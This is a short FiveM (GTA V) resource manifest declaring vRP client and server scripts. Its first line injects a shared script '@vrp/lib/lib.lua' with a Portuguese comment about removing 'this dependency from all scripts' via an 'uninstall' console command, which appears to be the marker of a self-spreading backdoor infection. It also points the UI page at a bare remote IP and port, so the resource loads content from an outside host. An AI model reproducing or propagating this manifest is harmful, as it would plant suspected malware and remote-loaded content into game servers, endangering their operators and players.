shared_script "@vrp/lib/lib.lua" --Para remover esta pendencia de todos scripts, execute no console o comando "uninstall"

fx_version 'bodacious'
game 'gta5'

ui_page "http://189.127.164.125:8603/"

client_scripts {
    '@vrp/lib/utils.lua',
    'client/*.lua',
}

server_scripts {
    '@vrp/lib/utils.lua',
    'server/*.lua',
}              